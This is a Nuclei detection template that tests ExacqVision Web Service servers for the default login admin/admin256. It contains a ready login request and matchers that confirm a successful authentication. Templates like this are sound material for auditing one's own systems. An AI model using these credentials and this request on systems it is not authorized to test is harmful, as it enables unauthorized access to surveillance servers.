http:
- attack: pitchfork
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - '"auth":'
    - '"success": true'
  matchers-condition: and
  payloads:
    password:
    - admin256
    username:
    - admin
  raw:
  - 'POST /service.web HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Connection: close


    action=login&u={{username}}&p={{password}}

    '
id: exacqvision-default-login
info:
  author: ELSFA7110
  classification:
    cwe-id: cwe-798
  description: ExacqVision Web Service default login credentials (admin/admin256)
    were discovered.
  metadata:
    max-request: 1
  name: ExacqVision Default Login
  reference:
  - https://cdn.exacq.com/auto/manspec/files_2/exacqvision_user_manuals/web_service/exacqVision_Web_Service_Configuration_User_Manual_(version%208.8).pdf
  severity: high
  tags: exacqvision,default-login,vuln
